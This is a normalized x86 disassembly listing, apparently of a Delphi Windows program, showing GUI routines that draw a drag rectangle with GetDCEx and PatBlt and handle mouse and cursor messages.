lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49ac67
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44b0fc
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_49ac6c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_49ad73
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
movzx eax [ ebx + 0x10 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov ecx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebx + 0x20 ]
call sub_49b8ec
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_49ac6c
pop ecx
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_498f64
mov eax [ ebp - 0x10 ]
call sub_49abe4
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49ad7a
lea eax [ ebp - 0x10 ]
call j_sub_449348
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_49ac6c
pop ecx
sub_49ad80
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_49af62
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push 0x1
lea eax [ ebp - 0xc ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x74 ]
mov edx [ ebp - 0xc ]
mov [ edx ] al
lea edx [ ebp - 0xc ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
movzx eax [ eax + 0x10 ]
mov edx [ ebp - 0xc ]
mov [ edx ] al
lea edx [ ebp - 0xc ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42723c
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_49aecd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_4950dc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0x14 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
mov [ ebp - 0x10 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49aed4
mov eax [ ebp - 0x18 ]
call sub_4481b0
retn
inc ebx
mov [ ebp - 0x10 ] 0x0
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x1c ]
call sub_49abe4
pop ecx
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x10 ]
call sub_4950f0
mov esi eax
cmp [ esi + 0x57 ] 0x0
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_49aed4
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
movzx edx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov ecx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x8 ]
call sub_49b8ec
mov [ ebp - 0x10 ] eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_49ac6c
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49af69
lea eax [ ebp - 0x1c ]
call j_sub_449348
lea eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_44b0fc
retn
sub_49af70
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_4992b8
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4992e0
call sub_49af70
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4992b8
call sub_49af70
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_498cb8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_4991dc
mov edx eax
mov eax ebx
call sub_499204
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_499204
jmp r-xdata
sub_49aff8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_49af70
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x80 ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_49b040
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
movzx eax [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_4991dc
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_499204
sub_49b074
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_496868
mov edx eax
mov eax [ rw-data ]
call sub_49beb8
mov eax [ ebx + 0x14 ]
call sub_496868
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_49b19c
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_49b0d4
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_49beb8
mov eax ebx
call sub_49b19c
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_499204
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_499204
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_49aff8
push ebx
push sub_49b178
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_49959c
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_49b150
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_4950dc
test eax eax
jle r-xdata
push ebx
push sub_49b178
xor edx edx
mov eax ebx
call sub_49959c
sub_49b19c
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_498d80
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_498d80
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_498e04
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_498e04
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_46df70
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_49b288
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
movzx eax [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_49b288
pop ecx
mov eax ebx
call sub_4991dc
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4991dc
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_49b288
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax ebx
call sub_4991dc
cmp eax esi
jle r-xdata
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax esi
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_49b318
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4991dc
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_498d38
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_4991dc
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_49b288
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_49b368
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_48d81c
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_48d81c
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_49b3e4
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_498c20
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_498cf0
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_4992c4
test eax eax
je r-xdata
mov eax esi
call sub_498cb8
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_49b178
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_49959c
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_4992c4
mov edx [ ebx + 0x20 ]
call sub_499218
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_49b3e4
pop ecx
sub_49b464
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_498c94
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_498c94
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_4992c4
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_49b464
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_49b178
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_49959c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_498ebc
mov eax edi
call sub_4992b8
test eax eax
je r-xdata
mov eax edi
call sub_4992c4
mov esi eax
mov eax esi
call sub_4991dc
push eax
mov eax esi
call sub_498cf0
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_4992b8
call sub_4991dc
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_4991dc
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_499204
mov eax esi
call sub_4991dc
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_499204
mov eax edi
call sub_4992c4
call sub_499258
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_498cf0
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_499204
mov eax edi
call sub_4992b8
call sub_499258
mov bl 0x1
jmp r-xdata
sub_49b59c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_499534
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_432a5c
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_499d18
test eax eax
je r-xdata
push ebp
call sub_49b3e4
pop ecx
push ebp
call sub_49b464
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_49b368
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_49b624
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov esi edx
mov edi eax
mov [ esp + 0xc ] 0x0
mov eax [ esi ]
cmp eax 0x204
jg r-xdata
sub eax 0x205
je r-xdata
je r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_476e90
mov ecx eax
mov dl 0x1
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
dec eax
je r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_476e90
mov ecx eax
mov dl 0x1
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x14 ]
jmp r-xdata
cmp eax 0x201
jg r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_476e90
mov ecx eax
or cl [ r-xdata ]
mov dl 0x1
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x14 ]
jmp r-xdata
sub eax 0xae2a
je r-xdata
sub eax 0x202
je r-xdata
je r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x32 ] 0x0
je r-xdata
mov edx esi
mov eax [ edi + 0x34 ]
call [ edi + 0x30 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_476e90
mov ecx eax
xor edx edx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
dec eax
je r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_476e90
mov ecx eax
xor edx edx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x14 ]
jmp r-xdata
sub eax 0x20
je r-xdata
mov edx esi
mov eax [ edi + 0x34 ]
call [ edi + 0x30 ]
mov [ esp + 0xc ] 0x1
mov ebp [ esi + 0x8 ]
lea eax [ ebp + 0x38 ]
push eax
lea ecx [ ebp + 0x18 ]
lea edx [ ebp + 0x28 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov eax [ esi + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_476e90
mov ecx eax
or cl [ r-xdata ]
xor edx edx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x14 ]
jmp r-xdata
jmp r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax [ edi + 0x14 ]
call sub_48dac0
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
cmp [ esi + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ esi + 0x4 ]
mov eax edi
call sub_49b59c
jmp r-xdata
mov eax [ edi + 0x14 ]
call sub_496868
cmp eax [ esi + 0x4 ]
jne r-xdata
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x10 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_476e90
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
jmp r-xdata
mov eax [ edi + 0x14 ]
call sub_495170
test eax eax
jle r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_499d18
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esp + 0x8 ] 0x12
jne r-xdata
mov eax [ ebx + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_47fbcc
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
mov [ esp + 0xc ] 0x1
jmp r-xdata
sub_49b8bc
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
mov [ esp ] ebx
fild [ esp ]
fdiv [ r-xdata ]
mov [ esp + 0x4 ] esi
fild [ esp + 0x4 ]
fmulp st1
call sub_447960
pop ecx
pop edx
pop esi
pop ebx
retn
sub_49b8ec
push ebx
push esi
add esp 0xfffffff8
mov ebx ecx
mov esi edx
test ebx ebx
je r-xdata
xor eax eax
mov [ esp ] esi
fild [ esp ]
mov [ esp + 0x4 ] ebx
fild [ esp + 0x4 ]
fdivp st1
fmul [ r-xdata ]
call sub_447960
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
sub_49b950
push ebx
mov eax [ ecx ]
sub eax [ edx + 0x40 ]
add eax eax
sub [ ecx ] eax
mov eax [ ecx + 0x4 ]
sub eax [ edx + 0x44 ]
add eax eax
sub [ ecx + 0x4 ] eax
mov eax [ ecx + 0x8 ]
sub eax [ ecx ]
mov ebx [ edx + 0x48 ]
sub ebx eax
mov eax ebx
add eax eax
sub [ ecx + 0x8 ] eax
mov eax [ ecx + 0xc ]
sub eax [ ecx + 0x4 ]
mov edx [ edx + 0x4c ]
sub edx eax
mov eax edx
add eax eax
test eax eax
jle r-xdata
pop ebx
retn
sub [ ecx + 0xc ] eax
sub_49b990
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx eax
test dl dl
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
test [ ebp - 0x1 ] 0x40
je r-xdata
lea ecx [ ebp - 0x2c ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_432a5c
lea edx [ ebp - 0x2c ]
lea ecx [ ebp - 0x8 ]
mov eax ebx
call sub_499d18
mov esi eax
test esi esi
je r-xdata
lea ecx [ ebp - 0x2c ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_432a5c
lea edx [ ebp - 0x2c ]
lea ecx [ ebp - 0x8 ]
mov eax ebx
call sub_499d18
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x8 ] 0x12
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x2c ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_432a5c
lea ecx [ ebp - 0x2c ]
mov edx esi
mov eax ebx
call sub_49b074
jmp r-xdata
cmp [ ebp - 0x8 ] 0x2
jne r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebx + 0x14 ]
call sub_496868
push eax
lea eax [ ebp - 0x24 ]
push eax
call PeekMessageW
test eax eax
jne r-xdata
call sub_48c3b0
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_48ede4
jmp r-xdata
mov ebx [ esi + 0x4 ]
cmp [ ebx + 0x8b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x1
mov eax ebx
call sub_48d12c
cmp al 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
or ecx 0xffffffff
xor edx edx
mov eax [ esi + 0x4 ]
call sub_48e71c
sub_49babc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_498d80
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_498d80
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_49b318
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_49b318
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_49bb4c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
call sub_49b19c
lea ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_432a5c
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x8 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_49babc
pop ecx
mov eax [ ebp - 0x4 ]
call sub_49b19c
sub_49bb9c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
test dl dl
jne r-xdata
pop esi
pop ebx
